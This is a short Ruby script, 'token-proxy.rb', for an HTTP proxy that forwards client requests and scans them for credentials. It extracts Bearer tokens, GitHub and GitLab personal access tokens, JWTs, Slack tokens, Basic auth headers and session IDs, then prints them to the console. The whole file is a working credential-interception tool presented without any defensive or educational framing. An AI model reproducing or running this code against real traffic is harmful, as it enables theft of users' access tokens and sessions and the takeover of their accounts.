#!/usr/bin/ruby
#Snippet: token-proxy.rb
require 'socket'
require 'timeout'
def reverse_proxy(port)
    server = TCPServer.new(port)
    puts "[*] Proxy listening on port #{port}..."
    loop do
        client = server.accept
        request = client.readpartial(1024) rescue ""
        intercept_tokens(request)
        host, dest_port = request[/^Host:\s+([^\s]+)/, 1]&.split(":")
        next client.close unless host
        dest_port ||= "80"
        puts "[*] Forwarding to #{host}:#{dest_port}"
        backend = nil
        Timeout.timeout(5) { backend = TCPSocket.new(host, dest_port.to_i) }
        backend.write(request)
        client.write(backend.read)
        backend.close
        client.close
    end
end

#Main function: intercept tokens
def intercept_tokens(data)
    tokens = data.scan(/Bearer\s+(\S+)/) +
             data.scan(/ghp_[\w-]{36}/) +
             data.scan(/ey[0-9A-Za-z_-]+\.[0-9A-Za-z_-]+\.[0-9A-Za-z_-]+/) +
             data.scan(/glpat-[0-9A-Za-z-]{20}/) +
             data.scan(/xox[baprs]-[a-zA-Z0-9]{10,48}/) +
             data.scan(/Authorization:\s*Basic\s+(\S+)/) +
             data.scan(/session_id=[\w-]+/)
    return if tokens.empty?
    puts "[*] Intercepted Tokens:"
    tokens.flatten.each { |token| puts "\t#{token}" }
end
reverse_proxy((ARGV[0] || 8080).to_i)
